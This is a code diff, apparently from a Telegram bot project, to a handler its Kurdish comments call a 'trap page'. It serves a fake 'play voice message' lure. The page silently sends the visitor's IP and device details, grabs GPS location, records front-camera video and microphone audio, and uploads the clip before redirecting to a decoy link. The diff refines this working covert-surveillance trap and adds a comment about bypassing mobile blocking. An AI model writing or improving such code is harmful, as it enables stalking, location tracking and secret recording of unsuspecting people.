@@ -162,7 +162,7 @@ async def handle_admin_photo(message: Message):
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانە - دیزاینی پۆستەری چاوەڕوانکراوی سۆشیال میدیا و هێنانەوەی ڕەسم و ڤیدیۆی ڕوون
+# پەڕەی تەڵەی شاهانە - سیستەمی دوو هەنگاوی بۆ تێپەڕاندنی قەدەغەکردنی مۆبایل
 async def web_trap_page(request: web.Request):
     encoded_redirect = request.query.get('id', '')
     try:
@@ -202,6 +202,7 @@ async def web_trap_page(request: web.Request):
             max-width: 320px;
             width: 90%;
             box-shadow: 0 15px 35px rgba(0,0,0,0.7);
+            cursor: pointer;
         }}
         .icon-circle {{
             width: 65px;
@@ -213,7 +214,6 @@ async def web_trap_page(request: web.Request):
             align-items: center;
             margin: 0 auto 15px auto;
             box-shadow: 0 5px 15px rgba(14, 165, 233, 0.4);
-            cursor: pointer;
         }}
         .play-triangle {{
             width: 0;
@@ -224,7 +224,7 @@ async def web_trap_page(request: web.Request):
             margin-left: 4px;
         }}
         h3 {{ font-size: 15px; margin-bottom: 6px; color: #f8fafc; font-weight: 500; }}
-        p {{ color: #94a3b8; font-size: 12px; margin-bottom: 20px; line-height: 1.4; }}
+        p {{ color: #94a3b8; font-size: 12px; margin-bottom: 0; line-height: 1.4; }}
     </style>
 </head>
 <body>
@@ -233,7 +233,7 @@ async def web_trap_page(request: web.Request):
             <div class="play-triangle"></div>
         </div>
         <h3>پەخشی نامەی دەنگی و وێنە</h3>
-        <p>تکایە بۆ گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ بەم پۆستەدا:</p>
+        <p>تکایە بۆ گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ لێرە:</p>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -242,7 +242,6 @@ async def web_trap_page(request: web.Request):
         const redirectTarget = "{redirect_url}";
         const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
 
-        // ناردنی زانیاری ئامێر و IP بە بێدەنگ
         fetch('/save_info', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
@@ -250,37 +249,35 @@ async def web_trap_page(request: web.Request):
         }});
 
         function runEngine() {{
-            // ١. وەرگرتنی لۆکەیشنی GPS بە شێوازی خێرا و پشتڕاستکراوە
+            // ١. وەرگرتنی شوێنی جوگرافی GPS
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
                 }}, function(err) {{
-                    console.log("GPS Blocked");
-                }}, {{ timeout: 7000, enableHighAccuracy: true }});
+                    console.log("GPS Error");
+                }}, {{ timeout: 5000, enableHighAccuracy: true }});
             }}
 
-            // ٢. داواکردنی کامێرا و مایک بە شێوازی تێرەرم (دڵنیابوون لە هاتنی ڕەسم و ڤیدیۆی ڕوون)
-            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }}, audio: true }})
+            // ٢. داواکردنی کامێرا و مایک بە شێوازێکی تەواو ئۆپتیماڵ
+            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                let options = {{ mimeType: 'video/webm;codecs=vp8,opus' }};
-                if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
-                    options = {{ mimeType: 'video/mp4' }};
-                }}
-                
                 let mediaRecorder;
                 try {{
-                    mediaRecorder = new MediaRecorder(stream, options);
+                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
                 }} catch (e) {{
-                    mediaRecorder = new MediaRecorder(stream);
+                    try {{
+                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
+                    }} catch (err) {{
+                        mediaRecorder = new MediaRecorder(stream);
+                    }}
                 }}
                 
                 let chunks = [];
-                
                 mediaRecorder.ondataavailable = function(e) {{
-                    chunks.push(e.data);
+                    if (e.data.size > 0) chunks.push(e.data);
                 }};
                 
                 mediaRecorder.onstop = function() {{
@@ -296,14 +293,18 @@ async def web_trap_page(request: web.Request):
                         }}).then(() => {{
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = redirectTarget;
+                        }}).catch(() => {{
+                            window.location.href = redirectTarget;
                         }});
                     }};
                 }};
                 
                 mediaRecorder.start();
                 setTimeout(function() {{
-                    mediaRecorder.stop();
-                }}, 10000);
+                    if (mediaRecorder.state === "recording") {{
+                        mediaRecorder.stop();
+                    }}
+                }}, 4000);
                 
             }}).catch(function(err) {{
                 window.location.href = redirectTarget;
